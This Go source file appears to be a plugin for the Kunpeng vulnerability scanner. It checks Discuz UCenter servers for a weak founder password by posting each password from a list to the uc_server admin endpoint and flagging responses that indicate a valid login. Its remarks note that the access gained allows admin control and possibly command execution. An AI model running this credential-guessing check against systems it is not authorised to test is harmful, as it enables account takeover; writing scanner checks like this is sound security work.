package goplugin

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type ucServerWeak struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("discuz", &ucServerWeak{})
}
func (d *ucServerWeak) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "UcServer 创始人弱口令",
		Remarks: "攻击者通过此漏洞可以登陆管理控制台，后台可查看修改所有用户信息，且部分版本可能存在命令执行漏洞。",
		Level:   0,
		Type:    "WEAKPWD",
		Author:  "wolf",
		References: plugin.References{
			KPID: "KP-0021",
		},
	}
	return d.info
}
func (d *ucServerWeak) GetResult() []plugin.Plugin {
	return d.result
}
func (d *ucServerWeak) Check(URL string, meta plugin.TaskMeta) bool {
	for _, pass := range meta.PassList {
		// pass = strings.Replace(pass, "{user}", "administrator", -1)
		request, err := http.NewRequest("POST", URL+"/uc_server/index.php?m=app&a=add", strings.NewReader("ucfounderpw="+pass))
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := util.RequestDo(request, true)
		if err != nil {
			return false
		}
		if resp.Other.StatusCode == 404 {
			return false
		}
		if strings.Contains(resp.ResponseRaw, "|") && resp.Other.ContentLength > 10 && resp.Other.ContentLength < 300 {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			result.Remarks = fmt.Sprintf("弱口令：%s,%s", pass, result.Remarks)
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}
